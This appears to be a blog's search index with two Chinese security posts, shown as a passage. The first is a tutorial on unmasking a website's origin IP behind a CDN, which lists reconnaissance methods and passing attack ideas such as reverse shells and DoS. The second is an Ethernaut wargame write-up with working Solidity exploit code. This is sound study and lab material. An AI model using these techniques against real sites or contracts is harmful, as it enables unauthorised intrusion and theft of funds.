<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>信息收集——绕过CDN寻找真实IP</title>
    <url>/2019/11/19/bypass-cdn/</url>
    <content><![CDATA[<h1 id="信息收集——绕过CDN寻找真实IP"><a href="#信息收集——绕过CDN寻找真实IP" class="headerlink" title="信息收集——绕过CDN寻找真实IP"></a>信息收集——绕过CDN寻找真实IP</h1><p>​    最近工作使用了很多CDN查询的网站工具之类的，为了以防以后忘记了，小小的总 (ban) 结 (yun) 一下。</p>
<p>​    以下是参考到的文章，感谢大佬们。</p>
<p>​    参考文章：</p>
<p> <a href="https://www.cnblogs.com/qiudabai/p/9763739.html" target="_blank" rel="noopener">https://www.cnblogs.com/qiudabai/p/9763739.html</a> </p>
<p> <a href="http://blog.leanote.com/post/snowming/CDN" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/CDN</a> </p>
<p> <a href="https://www.lsablog.com/networksec/penetration/some-ways-to-check-cdn-and-find-real-ip/" target="_blank" rel="noopener">https://www.lsablog.com/networksec/penetration/some-ways-to-check-cdn-and-find-real-ip/</a> </p>
<p> <a href="https://www.lstazl.com/cdn检测与绕过/" target="_blank" rel="noopener">https://www.lstazl.com/cdn%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p>
<p>​    首先我们要了解什么是CDN：</p>
<blockquote>
<p>CDN 即 <code>content delivery network</code>，内容交付网络，通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。</p>
<p>开了CDN 之后，会智能匹配当地最近的节点来的，所以请求的实际 IP 不同。</p>
</blockquote>
<p>​    对用户来说CDN的存在能够使你访问网站的响应速度更快，用户体验更好。</p>
<p>​    对网站所有者来说，CDN的存在减轻了服务器的压力，同时也将真实服务器IP隐藏了起来，降低被黑客入侵的风险。</p>
<h2 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h2><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>​    使用nslookup查询，如果查询结果是多个IP，则很大可能使用了CDN，如果返回一个IP也不一定是真实IP。</p>
<p>​    下面这种就是使用了CDN的：</p>
<p><img src="/2019/11/19/bypass-cdn/img1.png" alt></p>
<p>​    下面这种是没有使用CDN的：</p>
<p><img src="/2019/11/19/bypass-cdn/img2.png" alt></p>
<h3 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h3><p>​    使用各种多地 ping 的服务，查看返回的IP 地址是否唯一，如果返回的IP不是唯一的，那么很有可能使用了CDN。 </p>
<p>多地 Ping 网站有：<br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br><a href="https://www.17ce.com/" target="_blank" rel="noopener">https://www.17ce.com/</a><br><a href="https://wepcc.com/" target="_blank" rel="noopener">https://wepcc.com/</a></p>
<p><img src="/2019/11/19/bypass-cdn/img3.png" alt></p>
<p><img src="/2019/11/19/bypass-cdn/img4.png" alt></p>
<p><img src="/2019/11/19/bypass-cdn/img5.png" alt></p>
<p><img src="/2019/11/19/bypass-cdn/img6.png" alt></p>
<h3 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h3><p> <a href="http://www.12306.cn的响应头" target="_blank" rel="noopener">www.12306.cn的响应头</a></p>
<blockquote>
<p>Accept-Ranges: bytes<br>null: HTTP/1.1 200 OK<br>X-Cache: HIT from cache.51cdn.com<br>X-Via: 1.1 zib232:4 (Cdn Cache Server V2.0), 1.1 xz115:6 (Cdn Cache Server V2.0)<br>Connection: keep-alive<br>Last-Modified: Fri, 24 Oct 2014 09:24:58 GMT<br>Content-Length: 1480<br>Age: 22852<br>Date: Sat, 14 Oct 2017 04:22:44 GMT<br>X-Powered-By: Servlet/2.5 JSP/2.1<br>Content-Type: text/html</p>
</blockquote>
<p>从响应头字段可以看出cdn相关信息。 </p>
<h3 id="在线分析网站"><a href="#在线分析网站" class="headerlink" title="在线分析网站"></a>在线分析网站</h3><p><a href="https://builtwith.com/" target="_blank" rel="noopener">https://builtwith.com</a><br><a href="https://www.cdnplanet.com/tools/cdnfinder/" target="_blank" rel="noopener">https://www.cdnplanet.com/tools/cdnfinder/</a> </p>
<p><img src="/2019/11/19/bypass-cdn/img7.png" alt></p>
<p><img src="/2019/11/19/bypass-cdn/img8.png" alt></p>
<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>​    通过dig命令查看DNS解析记录， 一般有的 CNAME 的大多数是 CDN。 </p>
<p><img src="/2019/11/19/bypass-cdn/img9.png" alt></p>
<h3 id="CDN厂商ASN号和CDN段列表"><a href="#CDN厂商ASN号和CDN段列表" class="headerlink" title="CDN厂商ASN号和CDN段列表"></a>CDN厂商ASN号和CDN段列表</h3><p>​    在这篇<a href="http://blog.leanote.com/post/snowming/CDN" target="_blank" rel="noopener">文章</a>中 ，提到了一中域名批量CDN检测的方式，使用python脚本来进行扫描，脚本来源于 <a href="https://github.com/al0ne/Vxscan" target="_blank" rel="noopener">vxscan</a>(Author: al0ne) 。</p>
<blockquote>
<p>​    这个脚本的原理是利用 ASN。ASN 是自治系统号，相同组织的 ASN 是一样的，所以一个 CDN 厂商的 IP 段可能都在一个 ASN 里。</p>
<p>​    判断逻辑如下：</p>
<ol>
<li>解析域名，获取解析之后的 IP；</li>
<li>判断此 IP 是否命中国内外常见 CDN 段，如果命中，说明有 CDN；</li>
<li>对此 IP 查询其对应的 ASN 号（通过 <code>response = reader.asn(host)</code> 这一句代码）。如果获取的 ASN 号命中了上面的国内外常见 CDN 厂商的 ASN 号，说明有 CDN；</li>
<li>如果通过这两次判断都没有命中，那么极有可能说明是真实 IP。</li>
</ol>
</blockquote>
<h2 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h2><h3 id="nslookup-1"><a href="#nslookup-1" class="headerlink" title="nslookup"></a>nslookup</h3><p>​    使用国外冷门DNS进行域名解析，可能解析到真实IP。</p>
<h3 id="查询历史DNS记录"><a href="#查询历史DNS记录" class="headerlink" title="查询历史DNS记录"></a>查询历史DNS记录</h3><p>​    查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</p>
<p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">    DNS查询</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">    微步在线</a><br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">    在线域名信息查询</a><br><a href="http://viewdns.info/" target="_blank" rel="noopener">    DNS、IP等查询</a><br><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">    CDN查询IP</a></p>
<p>​    SecurityTrails</p>
<p>​    利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p>
<p><img src="/2019/11/19/bypass-cdn/img11.png" alt></p>
<p>​    除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p>
<h3 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h3><p>​    很多站长可能只会对主站或者流量大的子站点做了 CDN，很多在同一台服务器或者同一个C段内的其他子站点就没有做CDN，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p>
<p>​    修改host绑定到目标域名，能访问则目标域名和其子域名在同服务器，若不在可尝试c段。 </p>
<p>​    常用的子域名查找的方法和工具：</p>
<ol>
<li><p>一个大佬博客的工具：<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a> </p>
<p><img src="/2019/11/19/bypass-cdn/img13.png" alt></p>
</li>
<li><p>微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p>
</li>
</ol>
<p>​    输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p>
<p><img src="/2019/11/19/bypass-cdn/img12.png" alt="img"></p>
<ol start="3">
<li>Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</li>
</ol>
<p>​    只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br><img src="/2019/11/19/bypass-cdn/img14.png" alt="img"></p>
<ol start="4">
<li><p>Google 搜索</p>
<p>Google site:baidu.com -www 就能查看除www外的子域名，如图：</p>
</li>
</ol>
<p><img src="/2019/11/19/bypass-cdn/img15.png" alt="img"></p>
<ol start="5">
<li><p>各种子域名扫描器</p>
<p><a href="https://github.com/euphrat1ca/LayerDomainFinder" target="_blank" rel="noopener">子域名挖掘机</a></p>
<p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p>
</li>
</ol>
<p><img src="/2019/11/19/bypass-cdn/img16.png" alt="img"></p>
<p>​    <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subdomainbrute</a></p>
<p>​    Subdomainbrute以windows为例，打开cmd进入它所在的目录输入    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python subdomainbrute.py baidu.com --full</span><br></pre></td></tr></table></figure>

<p>​    即可收集百度的子域名，如图：</p>
<p><img src="/2019/11/19/bypass-cdn/img17.png" alt="img"></p>
<h3 id="网络空间引擎搜索法"><a href="#网络空间引擎搜索法" class="headerlink" title="网络空间引擎搜索法"></a>网络空间引擎搜索法</h3><ol>
<li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼(Zoomeye)</a></li>
</ol>
<p><img src="/2019/11/19/bypass-cdn/img18.png" alt></p>
<p>​    zoomeye 用户手册： <a href="https://www.zoomeye.org/doc?channel=user" target="_blank" rel="noopener">https://www.zoomeye.org/doc?channel=user</a> </p>
<ol start="2">
<li><a href="https://fofa.so/" target="_blank" rel="noopener">Fofa</a></li>
</ol>
<p><img src="/2019/11/19/bypass-cdn/img19.png" alt></p>
<p>​    查询语法在搜索页面即可看到。</p>
<ol start="3">
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a></li>
</ol>
<p>​    搜索语法： <a href="https://help.shodan.io/the-basics/search-query-fundamentals" target="_blank" rel="noopener">https://help.shodan.io/the-basics/search-query-fundamentals</a> </p>
<p>​    通过这些网络空间搜索引擎， 网站的title关键字或者网站的body特征就可以找出收录的有这些关键字的ip域名，很多时候能获取网站的真实ip </p>
<h3 id="利用SSL证书寻找真实原始IP"><a href="#利用SSL证书寻找真实原始IP" class="headerlink" title="利用SSL证书寻找真实原始IP"></a>利用SSL证书寻找真实原始IP</h3><p>​    转自 <a href="https://www.cnblogs.com/qiudabai/p/9763739.html" target="_blank" rel="noopener">https://www.cnblogs.com/qiudabai/p/9763739.html</a> </p>
<blockquote>
<p>使用给定的域名</p>
<p>假如你在xyz123boot.com上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端443（<a href="https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。" target="_blank" rel="noopener">https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。</a></p>
<p>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在xyz123boot.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
<p>目前Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
<p>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。</p>
<p>xyz123boot.com证书的搜索查询参数为：parsed.names：xyz123boot.com</p>
<p>只显示有效证书的查询参数为：tags.raw：trusted</p>
<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>组合后的搜索参数为：parsed.names: xyz123boot.com and tags.raw: trusted</p>
<p><img src="/2019/11/19/bypass-cdn/img20.png" alt="img"></p>
<p>Censys将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的。</p>
<p>要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts</p>
<p><img src="/2019/11/19/bypass-cdn/img21.png" alt="img"></p>
<p>此时，攻击者将看到一个使用特定证书的IPv4主机列表，而真实原始 IP就藏在其中。</p>
<p><img src="/2019/11/19/bypass-cdn/img22.png" alt="img"></p>
<p>你可以通过导航到端口443上的IP来验证，看它是否重定向到xyz123boot.com？或它是否直接在IP上显示网站？</p>
<p>使用给定的SSL证书</p>
<p>如果你是执法部门的人员，想要找出一个隐藏在cheesecp5vaogohv.onion下的儿童色情网站。做好的办法，就是找到其原始IP，这样你就可以追踪到其托管的服务器，甚至查到背后的运营商以及金融线索。</p>
<p>隐藏服务具有SSL证书，要查找它使用的IPv4主机，只需将”SHA1 fingerprint”（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</p>
</blockquote>
<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="HTTP标头寻找真实原始IP"><a href="#HTTP标头寻找真实原始IP" class="headerlink" title="HTTP标头寻找真实原始IP"></a>HTTP标头寻找真实原始IP</h3><blockquote>
<p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下：</p>
<p>80.http.get.headers.server:cloudflare</p>
<h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2019/11/19/bypass-cdn/img25.png" alt="img"></h3></blockquote>
<h3 id="利用网站返回的内容寻找真实原始IP"><a href="#利用网站返回的内容寻找真实原始IP" class="headerlink" title="利用网站返回的内容寻找真实原始IP"></a>利用网站返回的内容寻找真实原始IP</h3><blockquote>
<p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
<p>ga（’create’，’UA-93577176-1’，’auto’）;<br>可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
<p>搜索示例：<a href="https://www.shodan.io/search?query=http.html%3AUA-32023260-1" target="_blank" rel="noopener">https://www.shodan.io/search?query=http.html%3AUA-32023260-1</a></p>
<p><img src="/2019/11/19/bypass-cdn/img26.png" alt="img"></p>
</blockquote>
<h3 id="网站漏洞查找"><a href="#网站漏洞查找" class="headerlink" title="网站漏洞查找"></a>网站漏洞查找</h3><ol>
<li>目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</li>
<li>XSS盲打，命令执行反弹shell，SSRF等。</li>
<li>无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</li>
</ol>
<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="网站邮件订阅查找"><a href="#网站邮件订阅查找" class="headerlink" title="网站邮件订阅查找"></a>网站邮件订阅查找</h3><p>​    RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<p>​    也可让服务器发送一些非HTML的数据，比如让服务器发送邮件给你，查看邮件原文即可获得SMTP服务器的真实IP。</p>
<p>​    注册邮件<br>​    密码重置邮件<br>​    广告推送邮件</p>
<p>​    如下图，可以通过显示邮件原文，在原文中可能会有目标站点的IP。<img src="/2019/11/19/bypass-cdn/img23.png" alt></p>
<p><img src="/2019/11/19/bypass-cdn/img24.png" alt></p>
<h3 id="用-Zmap-扫全网"><a href="#用-Zmap-扫全网" class="headerlink" title="用 Zmap 扫全网"></a>用 Zmap 扫全网</h3><blockquote>
<p>​    需要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。</p>
</blockquote>
<h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h3 id="F5-LTM解码法"><a href="#F5-LTM解码法" class="headerlink" title="F5 LTM解码法"></a>F5 LTM解码法</h3><blockquote>
<p>​    当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
</blockquote>
<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><p>​     打光cdn流量，回溯真实ip。 这种不能轻易尝试，造成严重后果就不好了。</p>
<h3 id="针对CloudFlare"><a href="#针对CloudFlare" class="headerlink" title="针对CloudFlare"></a>针对CloudFlare</h3><p>​    如果目标站点使用的是cloudflare的CDN，可以去<a href="http://www.crimeflare.org:82/cfs.html#box" target="_blank" rel="noopener">crimeflare</a> 碰碰运气，说不定就会又意外的发现哦。</p>
<h2 id="验证真实IP"><a href="#验证真实IP" class="headerlink" title="验证真实IP"></a>验证真实IP</h2><p>​    找到真实 IP 后 先访问 IP 看看和原站是否一样。 如果不能直接访问，可能做了IP访问限制，可以通过修改hosts再访问网站，测试是否成功。 </p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethernaut WriteUp</title>
    <url>/2019/11/09/Ethernaut%20WriteUp/</url>
    <content><![CDATA[<h1 id="Zeppelin-Ethernaut-WriteUp"><a href="#Zeppelin-Ethernaut-WriteUp" class="headerlink" title="Zeppelin-Ethernaut-WriteUp"></a><a href="https://ethernaut.openzeppelin.com/" target="_blank" rel="noopener">Zeppelin-Ethernaut</a>-WriteUp</h1><p>参考文章：感谢大佬 <a href="https://www.jianshu.com/u/2631d3e59e33" target="_blank" rel="noopener">xuing</a></p>
<p><a href="https://www.jianshu.com/p/161d554a591c" target="_blank" rel="noopener">Ethernaut WriteUp 更新到22题 Shop</a></p>
<p>本文单纯记录下自己的学（mo）习（yu）过程。</p>
<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>第一关很简单，首先是教你如何去使用<a href="https://metamask.io/" target="_blank" rel="noopener">MetaMask浏览器扩展程序</a>。</p>
<p>使用基础命令查看信息：</p>
<ul>
<li><p>player ：查看自己的地址。</p>
</li>
<li><p>getBalance(player) ：查看当前的以太币余额。</p>
</li>
<li><p>contract.abi() ：查看合约接口，即可以调用的函数。</p>
</li>
<li><p>help() ：查看控制台中其他可用命令。</p>
</li>
</ul>
<p>解题：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.info()</span><br><span class="line">// &quot;You will find what you need in info1().&quot;</span><br><span class="line">contract.info1()</span><br><span class="line">// &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;</span><br><span class="line">contract.info2(&apos;hello&apos;)</span><br><span class="line">// &quot;The property infoNum holds the number of the next info method to call.&quot;</span><br><span class="line">contract.infoNum()</span><br><span class="line">// 42</span><br><span class="line">contract.info42()</span><br><span class="line">// &quot;theMethodName is the name of the next method.&quot;</span><br><span class="line">contract.theMethodName()</span><br><span class="line">// &quot;The method name is method7123949.&quot;</span><br><span class="line">contract.method7123949()</span><br><span class="line">// &quot;If you know the password, submit it to authenticate().&quot;</span><br><span class="line">contract.abi</span><br><span class="line">//查看合约接口，寻找password，发现存在一个名为password的函数</span><br><span class="line">contract.password()</span><br><span class="line">// &quot;ethernaut0&quot;</span><br><span class="line">contract.authenticate(&apos;ethernaut0&apos;)</span><br></pre></td></tr></table></figure>

<p>点击Submit instance，第一关over。</p>
<p>关键：</p>
<ul>
<li>contract.functionName() 调用合约函数</li>
<li>contract.abi 查看函数接口</li>
</ul>
<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>通关要求：</p>
<ul>
<li><p>获得合约所有权</p>
</li>
<li><p>将合余额减少为0</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//withdraw函数是只能由合约拥有者才能访问的，功能是取出合约内部全部资金</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line">//fallback函数，获得合约所有权</span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//保证在执行fallBack函数时，能通过contributions[msg.sender] &gt; 0的校验</span><br><span class="line">contract.contribute(&#123;value:1&#125;)  </span><br><span class="line">//通过转账调用fallback函数。</span><br><span class="line">contract.sendTransaction(&#123;value:1&#125;)</span><br><span class="line">//将合约中的钱，全部收入囊中。</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>fallback函数：<ul>
<li>没有名字，不能有参数，没有返回值</li>
<li>当调用的函数找不到时，就会调用默认的fallback函数 </li>
<li>当我们使用<code>address.send(ether to send)</code>向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数 </li>
</ul>
</li>
</ul>
<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><p>通过要求：</p>
<ul>
<li>获取合约所有权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* constructor */</span><br><span class="line">function Fal1out() public payable &#123;</span><br><span class="line">  owner = msg.sender;</span><br><span class="line">  allocations[owner] = msg.value;</span><br><span class="line">&#125;</span><br><span class="line">//具有误导作用的constructor，仔细看会发现该函数并非构造函数，其名字中有个1</span><br></pre></td></tr></table></figure>

<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.Fal1out()</span><br></pre></td></tr></table></figure>

<p>就是这么简单！</p>
<p>关键：</p>
<ul>
<li>构造函数<ul>
<li>0.4.22之前的版本  使用合约名来作为构造函数     function Fallout(){}</li>
<li>在0.4.22版本以及之后版本，构造函数使用  constructor() public{ }来定义</li>
<li>使用function定义构造函数，如果函数名出错，会导致本应是构造函数的函数变成一般函数，从而导致用户意外调用该函数，造成严重后果</li>
</ul>
</li>
</ul>
<p>危害详情见：<a href="https://paper.seebug.org/630/" target="_blank" rel="noopener">从以太坊”MorphToken事件”看智能合约构造函数大小写编码错误漏洞</a></p>
<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>通关条件：</p>
<ul>
<li>连续猜对10次硬币翻转结果</li>
</ul>
<p>很明显，直接调用函数去猜测成功率接近0，所以我们需要使用合约来获取结果，然后将正确结果传入题目合约。</p>
<p>解题：</p>
<p>POC1（抄的大佬的，2333333）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.18 &lt;0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./CoinFlip.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CoinFlipPoc &#123;</span><br><span class="line">  CoinFlip expFlip;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"> </span><br><span class="line">  constructor (address aimAddr) public &#123;</span><br><span class="line">    expFlip = CoinFlip(aimAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool guess = coinFlip == 1 ? true : false;</span><br><span class="line">    expFlip.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SafeMath.sol的一个GitHub地址：<br><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol" target="_blank" rel="noopener">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol</a></p>
<p>直接复制一份题目源码，新建一个名为CoinFlip.sol的文字，粘贴进去。</p>
<p>需要注意的就是solidity版本，有些SafeMath.sol使用的是0.5.0版本，所以需要修改一下CoinFlip.sol中的版本。</p>
<p>由于每次猜测都做了if (lastHash == blockValue) 判断，所以我们猜测一次后需要等到新区块生成后进行下一次猜测，不能使用for循环进行自动猜测。</p>
<p>POC2（给大佬跪了，还是抄的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let blockHash = function() &#123;</span><br><span class="line">  return new Promise(</span><br><span class="line">    (resolve, reject) =&gt; web3.eth.getBlock(&apos;latest&apos;, (error, result) =&gt; &#123;</span><br><span class="line">      if(!error)</span><br><span class="line">          resolve(result[&apos;hash&apos;]);</span><br><span class="line">      else</span><br><span class="line">          reject(error);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract.flip(parseInt((await blockHash())[2], 16) &gt; 8)</span><br></pre></td></tr></table></figure>

<p>这种方式就不需要再去部署合约，直接在控制面版进行操作！妙啊！这就是大佬和我的区别啊！</p>
<p>使用 contract.consecutiveWins() 可以查看连胜次数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.consecutiveWins()</span><br><span class="line">  Promise &#123;&lt;pending&gt;&#125;</span><br><span class="line">	__proto__: Promise</span><br><span class="line">  	  [[PromiseStatus]]: &quot;resolved&quot;</span><br><span class="line">	  [[PromiseValue]]: t</span><br><span class="line">		c: [5] //此处数字代表猜对次数</span><br><span class="line">		e: 0</span><br><span class="line">		s: 1</span><br><span class="line">	  __proto__: Object</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>block.blockhash (function(uint) returns (bytes32)):指定块的哈希值—— 仅可用于最新的 256 个区块且不包括当前区块  <ul>
<li>0.4.22  版本开始已不推荐使用 ，由 blockhash(uint blockNumber) 代替</li>
</ul>
</li>
</ul>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>通关条件：</p>
<ul>
<li>获得合约所有权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (tx.origin != msg.sender) &#123;</span><br><span class="line">	owner = _owner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由上面代码可以知道，获取所有权很简单，只要tx.origin不等于msg.sender就行。</p>
<p>简单来说就是我们调用一个合约，在由这个合约来调用题目合约。</p>
<p>POC（一个字，抄！）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.18 &lt;0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Telephone.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TelephonePoc &#123;</span><br><span class="line">    </span><br><span class="line">    Telephone phone;</span><br><span class="line">    </span><br><span class="line">    function TelephonePoc(address aimAddr) public &#123;</span><br><span class="line">        phone = Telephone(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack(address _owner) public&#123;</span><br><span class="line">        phone.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>tx.origin &amp; msg.sender<ul>
<li>使用tx.origin的所有者永远不可能是一个合约</li>
<li>使用msg.sender的所有者可能是一个合约</li>
